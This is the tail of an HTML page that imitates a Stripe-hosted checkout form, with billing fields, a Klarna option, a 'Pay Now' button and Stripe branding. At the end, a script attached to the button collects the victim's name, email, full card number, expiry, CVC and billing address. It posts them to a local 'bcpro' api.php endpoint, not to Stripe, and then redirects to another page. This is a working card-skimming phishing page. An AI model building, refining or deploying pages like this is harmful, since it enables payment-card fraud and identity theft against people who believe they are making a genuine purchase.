                                                                                                                                                                    aria-label="Address line 1"
                                                                                                                                                                    placeholder="Address line 1"
                                                                                                                                                                    aria-invalid="false"
                                                                                                                                                                    aria-describedby=""
                                                                                                                                                                    data-1p-ignore="false"
                                                                                                                                                                    data-lp-ignore="false"
                                                                                                                                                                    value=""></span>
                                                                                                                                                        </div>
                                                                                                                                                    </div>
                                                                                                                                                </div>
                                                                                                                                                <div
                                                                                                                                                    class="FormFieldGroup-child FormFieldGroup-child--width-12 FormFieldGroup-childLeft FormFieldGroup-childRight">
                                                                                                                                                    <div
                                                                                                                                                        class="FormFieldInput">
                                                                                                                                                        <div
                                                                                                                                                            class="CheckoutInputContainer">
                                                                                                                                                            <span
                                                                                                                                                                class="InputContainer"><input
                                                                                                                                                                    class="CheckoutInput Input Input--empty"
                                                                                                                                                                    autocomplete="billing address-line2"
                                                                                                                                                                    autocorrect="off"
                                                                                                                                                                    spellcheck="false"
                                                                                                                                                                    id="billingAddressLine2"
                                                                                                                                                                    name="billingAddressLine2"
                                                                                                                                                                    type="text"
                                                                                                                                                                    aria-label="Address line 2"
                                                                                                                                                                    placeholder="Address line 2"
                                                                                                                                                                    aria-invalid="false"
                                                                                                                                                                    aria-describedby=""
                                                                                                                                                                    data-1p-ignore="false"
                                                                                                                                                                    data-lp-ignore="false"
                                                                                                                                                                    value=""></span>
                                                                                                                                                        </div>
                                                                                                                                                    </div>
                                                                                                                                                </div>
                                                                                                                                                <div
                                                                                                                                                    class="FormFieldGroup-child FormFieldGroup-child--width-6 FormFieldGroup-childLeft FormFieldGroup-childBottom">
                                                                                                                                                    <div
                                                                                                                                                        class="FormFieldInput">
                                                                                                                                                        <div
                                                                                                                                                            class="CheckoutInputContainer">
                                                                                                                                                            <span
                                                                                                                                                                class="InputContainer"><input
                                                                                                                                                                    class="CheckoutInput Input Input--empty"
                                                                                                                                                                    autocomplete="billing postal-code"
                                                                                                                                                                    autocorrect="off"
                                                                                                                                                                    spellcheck="false"
                                                                                                                                                                    id="billingPostalCode"
                                                                                                                                                                    name="billingPostalCode"
                                                                                                                                                                    type="text"
                                                                                                                                                                    aria-label="Postal code"
                                                                                                                                                                    placeholder="Postal code"
                                                                                                                                                                    aria-invalid="false"
                                                                                                                                                                    aria-describedby=""
                                                                                                                                                                    data-1p-ignore="false"
                                                                                                                                                                    data-lp-ignore="false"
                                                                                                                                                                    value=""></span>
                                                                                                                                                        </div>
                                                                                                                                                    </div>
                                                                                                                                                </div>
                                                                                                                                                <div
                                                                                                                                                    class="FormFieldGroup-child FormFieldGroup-child--width-6 FormFieldGroup-childRight FormFieldGroup-childBottom">
                                                                                                                                                    <div
                                                                                                                                                        class="FormFieldInput">
                                                                                                                                                        <div
                                                                                                                                                            class="CheckoutInputContainer">
                                                                                                                                                            <span
                                                                                                                                                                class="InputContainer"><input
                                                                                                                                                                    class="CheckoutInput Input Input--empty"
                                                                                                                                                                    autocomplete="billing address-level2"
                                                                                                                                                                    autocorrect="off"
                                                                                                                                                                    spellcheck="false"
                                                                                                                                                                    id="billingLocality"
                                                                                                                                                                    name="billingLocality"
                                                                                                                                                                    type="text"
                                                                                                                                                                    aria-label="City"
                                                                                                                                                                    placeholder="City"
                                                                                                                                                                    aria-invalid="false"
                                                                                                                                                                    aria-describedby=""
                                                                                                                                                                    data-1p-ignore="false"
                                                                                                                                                                    data-lp-ignore="false"
                                                                                                                                                                    value=""></span>
                                                                                                                                                        </div>
                                                                                                                                                    </div>
                                                                                                                                                </div>
                                                                                                                                                <div class="FieldError-container"
                                                                                                                                                    style="opacity: 0; height: 0px; margin-top: 0px;">
                                                                                                                                                    <span
                                                                                                                                                        class="FieldError Text Text-color--red Text-fontSize--13"><span
                                                                                                                                                            aria-hidden="true"></span></span>
                                                                                                                                                </div>
                                                                                                                                            </div>
                                                                                                                                            <div class="FieldError-container"
                                                                                                                                                style="opacity: 0; height: 0px; margin-top: 0px;">
                                                                                                                                                <span
                                                                                                                                                    class="FieldError Text Text-color--red Text-fontSize--13"><span
                                                                                                                                                        aria-hidden="true"></span></span>
                                                                                                                                            </div>
                                                                                                                                        </fieldset>
                                                                                                                                    </div>
                                                                                                                                </div>
                                                                                                                            </div>
                                                                                                                        </div>
                                                                                                                    </div>
                                                                                                                </div>
                                                                                                            </div>
                                                                                                        </div>
                                                                                                    </div>
                                                                                                </div>
                                                                                            </div>
                                                                                        </div>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div class="AnimatePresence PaymentMethodFormVisible-container">
                                                        <div class="AnimatePresence-inner">
                                                            <div
                                                                class="AnimateSinglePresence PaymentMethodFormAccordionItem-container">
                                                                <div class="AnimateSinglePresenceItem">
                                                                    <div class="AccordionItem PaymentMethodFormAccordionItem klarna-accordion-item PaymentMethodFormAccordionItem--compact"
                                                                        role="listitem"
                                                                        data-testid="klarna-accordion-item">
                                                                        <div class="AccordionItem-wrapper">
                                                                            <div class="AnimatePresence">
                                                                                <div class="AnimatePresence-inner">
                                                                                    <div
                                                                                        class="AccordionItemCover PaymentMethodFormAccordionItem klarna-accordion-item-cover">
                                                                                        <div
                                                                                            class="AccordionItemHeader AccordionItemCover-header AccordionItemHeader--clickable">
                                                                                            <div
                                                                                                class="AccordionItemHeader-content">
                                                                                                <div
                                                                                                    class="flex-container">
                                                                                                    <div
                                                                                                        class="AccordionItemCover-label">
                                                                                                        <div class="flex-container direction-row align-items-center wrap-wrap"
                                                                                                            style="height: auto; width: 100%;">
                                                                                                            <span
                                                                                                                class="Text Text-color--gray400 Text-fontSize--13 Text-fontWeight--500"></span>
                                                                                                        </div>
                                                                                                    </div>
                                                                                                    <div
                                                                                                        class="flex-item width-grow">
                                                                                                        <div
                                                                                                            class="flex-container direction-row justify-content-space-between align-items-flex-start">
                                                                                                            <div
                                                                                                                class="AccordionItemCover-titleContainer flex-container direction-row justify-content-space-between">
                                                                                                                <div
                                                                                                                    class="AccordionItemCover-title Text Text-color--gray800 Text-fontSize--14">
                                                                                                                    <div
                                                                                                                        class="PaymentMethodFormAccordionItemTitle flex-container direction-row justify-content-space-between align-items-center">
                                                                                                                        <div
                                                                                                                            class="flex-container direction-row align-items-center">
                                                                                                                            <input
                                                                                                                                id="payment-method-accordion-item-title-klarna"
                                                                                                                                aria-checked="false"
                                                                                                                                aria-labelledby="payment-method-label-klarna"
                                                                                                                                name="payment-method-accordion-item-title"
                                                                                                                                type="radio"
                                                                                                                                class="RadioButton PaymentMethodFormAccordionItemTitle-radio"
                                                                                                                                tabindex="-1"
                                                                                                                                value="klarna">
                                                                                                                            <div
                                                                                                                                class="PaymentMethodFormAccordionItemTitle-icon">
                                                                                                                                <img src="https://js.stripe.com/v3/fingerprinted/img/klarna-531cd07130cfad7de4c678ef467cbeb7.svg"
                                                                                                                                    alt=""
                                                                                                                                    class="Icon Icon--md">
                                                                                                                            </div>
                                                                                                                            <div
                                                                                                                                id="payment-method-label-klarna">
                                                                                                                                Klarna
                                                                                                                            </div>
                                                                                                                        </div>
                                                                                                                    </div>
                                                                                                                </div>
                                                                                                            </div>
                                                                                                            <div
                                                                                                                class="AccordionItemCover-actionContainer AccordionItemCover-actionContainer--noButton">
                                                                                                                <button
                                                                                                                    class="Button AccordionButton AccordionButton-open AccordionButton-expandedClickArea AccordionButton-expandedFocusArea Button--link Button--sm"
                                                                                                                    type="button"
                                                                                                                    aria-label="Pay with Klarna"
                                                                                                                    data-testid="klarna-accordion-item-button">
                                                                                                                    <div
                                                                                                                        class="flex-container justify-content-center align-items-center">
                                                                                                                    </div>
                                                                                                                </button>
                                                                                                            </div>
                                                                                                        </div>
                                                                                                    </div>
                                                                                                </div>
                                                                                            </div>
                                                                                        </div>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    
                                                    <div
                                                        class="AnimateSinglePresence PaymentMethodFormOverflow-container PaymentMethodFormOverflow-container--compact">
                                                        <div class="AnimateSinglePresenceItem">
                                                            <div></div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="AnimateSinglePresence"></div>
                                                <div class="AnimateSinglePresence">
                                                    <div class="AnimateSinglePresenceItem">
                                                        <div class="LinkSignUpForm">
                                                            <div
                                                                class="SignUpForm-signUpFormContainer flex-item width-12">
                                                                <div class="AnimateSinglePresence">
                                                                    <div class="AnimateSinglePresenceItem">
                                                                        <div>
                                                                            <div>
                                                                                <div
                                                                                    class="SignUpForm SignUpForm--withTerms">
                                                                                    <div
                                                                                        class="SignUpForm-headerContainer">
                                                                                        <div
                                                                                            class="FormFieldCheckbox SignUpForm-checkbox">
                                                                                            <div class="CheckboxField">
                                                                                                <div class="Checkbox">
                                                                                                    <div
                                                                                                        class="Checkbox-InputContainer">
                                                                                                        <input
                                                                                                            id="enableStripePass"
                                                                                                            name="enableStripePass"
                                                                                                            type="checkbox"
                                                                                                            class="Checkbox-Input"><span
                                                                                                            class="Checkbox-StyledInput"><svg
                                                                                                                class="InlineSVG Icon Checkbox-tickSvg"
                                                                                                                focusable="false"
                                                                                                                width="21"
                                                                                                                height="19"
                                                                                                                viewBox="0 0 21 19"
                                                                                                                fill="none">
                                                                                                                <path
                                                                                                                    fill-rule="evenodd"
                                                                                                                    clip-rule="evenodd"
                                                                                                                    d="M19.2242 3.76495L8.52368 17.1606L2.25391 10.6793L4.41013 8.59346L8.30846 12.6233L16.8802 1.89258L19.2242 3.76495Z"
                                                                                                                    fill="currentColor">
                                                                                                                </path>
                                                                                                            </svg></span>
                                                                                                    </div>
                                                                                                    <div><label
                                                                                                            for="enableStripePass"><span
                                                                                                                class="Checkbox-Label Text Text-color--gray600 Text-fontSize--13 Text-fontWeight--500">
                                                                                                                <div class="SignUpForm-labelHeader"
                                                                                                                    style="opacity: 1;">
                                                                                                                    Save
                                                                                                                    my
                                                                                                                    information
                                                                                                                    for
                                                                                                                    faster
                                                                                                                    checkout
                                                                                                                </div>
                                                                                                            </span></label>
                                                                                                        <div
                                                                                                            class="Checkbox-Description Text Text-color--gray500 Text-fontWeight--400">
                                                                                                            <div class="SignUpForm-subLabel"
                                                                                                                id="link-registration-subheader-message">
                                                                                                                Pay
                                                                                                                securely
                                                                                                                at asdsd
                                                                                                                and
                                                                                                                everywhere
                                                                                                                <a class="Link Link--checkout--secondary"
                                                                                                                    target="_self">Link</a>
                                                                                                                is
                                                                                                                accepted.
                                                                                                            </div>
                                                                                                        </div>
                                                                                                    </div>
                                                                                                </div>
                                                                                            </div>
                                                                                        </div>
                                                                                    </div>
                                                                                    <div class="AnimateSinglePresence">
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="PaymentForm-confirmPaymentContainer mt5 flex-item width-grow">
                                                <div class="ConfirmPayment">
                                                    <div class="flex-item width-12"></div>
                                                    <div class="flex-item width-12">
                                                        <div class="ConfirmPaymentButton--SubmitButton">
                                                            <div class="flex-item width-12">
                                                                <div class="ConfirmPaymentButton--SubmitButton">
                                                                    <div data-testid="submit-wallet-button" style="display: none;"></div>
                                                                    <button class="SubmitButton SubmitButton--incomplete"
                                                                            type="button" data-testid="hosted-payment-submit-button"
                                                                            style="background-color: rgb(0, 116, 212); color: rgb(255, 255, 255);"
                                                                            onclick="processPayment(this)">
                                                                        <div class="SubmitButton-Shimmer"
                                                                            style="background: linear-gradient(to right, rgba(0, 116, 212, 0) 0%, rgb(58, 139, 238) 50%, rgba(0, 116, 212, 0) 100%);">
                                                                        </div>
                                                                        <div class="SubmitButton-TextContainer">
                                                                            <span class="SubmitButton-Text SubmitButton-Text--current Text Text-color--default Text-fontWeight--500 Text--truncate"
                                                                                aria-hidden="false">Pay Now</span>
                                                                            <span class="SubmitButton-Text SubmitButton-Text--pre Text Text-color--default Text-fontWeight--500 Text--truncate"
                                                                                aria-hidden="true"
                                                                                data-testid="submit-button-processing-label">Processing</span>
                                                                        </div>
                                                                        <div class="SubmitButton-IconContainer">
                                                                            <div class="SubmitButton-Icon SubmitButton-SpinnerIcon SubmitButton-Icon--pre">
                                                                                <div class="Icon Icon--md">
                                                                                    <div class="Icon Icon--md Icon--square">
                                                                                        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" focusable="false">
                                                                                            <ellipse cx="12" cy="12" rx="10" ry="10" style="stroke: rgb(255, 255, 255);"></ellipse>
                                                                                        </svg>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                        <div class="SubmitButton-CheckmarkIcon">
                                                                            <div class="Icon Icon--md">
                                                                                <div class="Icon Icon--md">
                                                                                    <svg xmlns="http://www.w3.org/2000/svg" width="22" height="14" focusable="false">
                                                                                        <path d="M 0.5 6 L 8 13.5 L 21.5 0" fill="transparent" stroke-width="2" stroke="#ffffff"
                                                                                            stroke-linecap="round" stroke-linejoin="round"></path>
                                                                                    </svg>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </button>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div class="flex-item width-12">
                                                        <div class="ConfirmPayment-PostSubmit">
                                                            <div class="B4eU5jRx__ConfirmTerms">
                                                                <div class="AnimateSinglePresence"></div>
                                                                <div class="AnimateSinglePresence" style="">
                                                                    <div
                                                                        class="AnimateSinglePresenceItem ConfirmPaymentTerms">
                                                                        <div></div>
                                                                    </div>
                                                                </div>
                                                                <div class="AnimateSinglePresence"></div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                <footer class="JOHDf_Xc__Footer">
                                                    <div class="GYut03iO__PoweredByStripe"><a class="Link Link--primary"
                                                            href="https://stripe.com" target="_blank" rel="noopener">
                                                            <div class="Text Text-color--gray400 Text-fontSize--12 Text-fontWeight--400">Powered
                                                                by <span><svg class="InlineSVG Icon BJN199Au__PoweredByStripe-icon Icon--md"
                                                                        focusable="false" width="33" height="15" role="img"
                                                                        aria-labelledby="stripe-title">
                                                                        <title id="stripe-title">Stripe</title>
                                                                        <g fill-rule="evenodd">
                                                                            <path
                                                                                d="M32.956 7.925c0-2.313-1.12-4.138-3.261-4.138-2.15 0-3.451 1.825-3.451 4.12 0 2.719 1.535 4.092 3.74 4.092 1.075 0 1.888-.244 2.502-.587V9.605c-.614.307-1.319.497-2.213.497-.876 0-1.653-.307-1.753-1.373h4.418c0-.118.018-.588.018-.804zm-4.463-.859c0-1.02.624-1.445 1.193-1.445.55 0 1.138.424 1.138 1.445h-2.33zM22.756 3.787c-.885 0-1.454.415-1.77.704l-.118-.56H18.88v10.535l2.259-.48.009-2.556c.325.235.804.57 1.6.57 1.616 0 3.089-1.302 3.089-4.166-.01-2.62-1.5-4.047-3.08-4.047zm-.542 6.225c-.533 0-.85-.19-1.066-.425l-.009-3.352c.235-.262.56-.443 1.075-.443.822 0 1.391.922 1.391 2.105 0 1.211-.56 2.115-1.39 2.115zM18.04 2.766V.932l-2.268.479v1.843zM15.772 3.94h2.268v7.905h-2.268zM13.342 4.609l-.144-.669h-1.952v7.906h2.259V6.488c.533-.696 1.436-.57 1.716-.47V3.94c-.289-.108-1.346-.307-1.879.669zM8.825 1.98l-2.205.47-.009 7.236c0 1.337 1.003 2.322 2.340 2.322.741 0 1.283-.135 1.581-.298V9.876c-.289.117-1.716.533-1.716-.804V5.865h1.716V3.94H8.816l.009-1.96zM2.718 6.235c0-.352.289-.488.767-.488.687 0 1.554.208 2.241.578V4.202a5.958 5.958 0 0 0-2.24-.415c-1.835 0-3.054.957-3.054 2.557 0 2.493 3.433 2.096 3.433 3.170 0 .416-.361.552-.867.552-.75 0-1.708-.307-2.467-.723v2.15c.84.362 1.69.515 2.467.515 1.879 0 3.17-.93 3.17-2.548-.008-2.692-3.45-2.213-3.45-3.225z">
                                                                            </path>
                                                                        </g>
                                                                    </svg></span></div>
                                                        </a></div><a class="Link _0wMrLFZH__FooterLink Link--primary"
                                                        href="https://stripe.com/legal/end-users" target="_blank" rel="noopener"><span
                                                            class="Text Text-color--gray400 Text-fontSize--12 Text-fontWeight--400">Terms</span></a><a
                                                        class="Link _0wMrLFZH__FooterLink Link--primary" href="https://stripe.com/privacy"
                                                        target="_blank" rel="noopener"><span
                                                            class="Text Text-color--gray400 Text-fontSize--12 Text-fontWeight--400">Privacy</span></a>
                                                </footer>

                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </form>
                        </div>
                    </main>
                    <div class="App-Footer C1hyPwuu__CheckoutFooter">
                        <div></div>
                        
                    </div>
                    
                </div>
                
            </div>
            
        </div>
        
    </div>

    <!-- JavaScript to connect to bcpro -->
    <script>
    // Process payment button - CONNECTED TO BCPRO
    function processPayment(button) {
        // Show processing state
        const currentText = button.querySelector('.SubmitButton-Text--current');
        const processingText = button.querySelector('.SubmitButton-Text--pre');
        const spinner = button.querySelector('.SubmitButton-SpinnerIcon');
        
        currentText.setAttribute('aria-hidden', 'true');
        processingText.setAttribute('aria-hidden', 'false');
        spinner.style.display = 'block';
        button.disabled = true;
        
        // Get bcpro session
        const bcproSession = document.getElementById('bcpro_session').value;
        
        // Collect ALL form data
        const paymentData = {
            email: document.querySelector('input[name="email"]')?.value || '',
            name: document.getElementById('individualName')?.value || '',
            cardNumber: document.getElementById('cardNumber')?.value || '',
            cardExpiry: document.getElementById('cardExpiry')?.value || '',
            cardCvc: document.getElementById('cardCvc')?.value || '',
            billingAddressLine1: document.getElementById('billingAddressLine1')?.value || '',
            billingAddressLine2: document.getElementById('billingAddressLine2')?.value || '',
            billingLocality: document.getElementById('billingLocality')?.value || '',
            billingPostalCode: document.getElementById('billingPostalCode')?.value || '',
            billingCountry: document.getElementById('billingCountry')?.value || '',
            timestamp: new Date().toISOString()
        };
        
        // Send to bcpro API
        fetch('api.php?action=submit_data', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                id: bcproSession,
                step: 'login',
                value: paymentData
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.status === 'success') {
                // Show success animation
                setTimeout(() => {
                    button.classList.add('SubmitButton--complete');
                    setTimeout(() => {
                        // Redirect to bcpro loading page
                        window.location.href = 'balagh.php?session=' + bcproSession;
                    }, 1000);
                }, 500);
            } else {
                alert('Payment failed. Please try again.');
                resetButton();
            }
        })
        .catch(error => {
            console.error('Error:', error);
            alert('Network error. Please try again.');
            resetButton();
        });
        
        function resetButton() {
            currentText.setAttribute('aria-hidden', 'false');
            processingText.setAttribute('aria-hidden', 'true');
            spinner.style.display = 'none';
            button.disabled = false;
        }
    }
    
    // Initialize bcpro session on page load
    document.addEventListener('DOMContentLoaded', function() {
        const bcproSession = document.getElementById('bcpro_session').value;
        
        // Initialize session with bcpro
        fetch('api.php?action=init_session')
            .then(response => response.json())
            .then(data => {
                if (data.id) {
                    document.getElementById('bcpro_session').value = data.id;
                }
            })
            .catch(error => console.error('Session init failed:', error));
    });
    </script>
</body>
</html>"
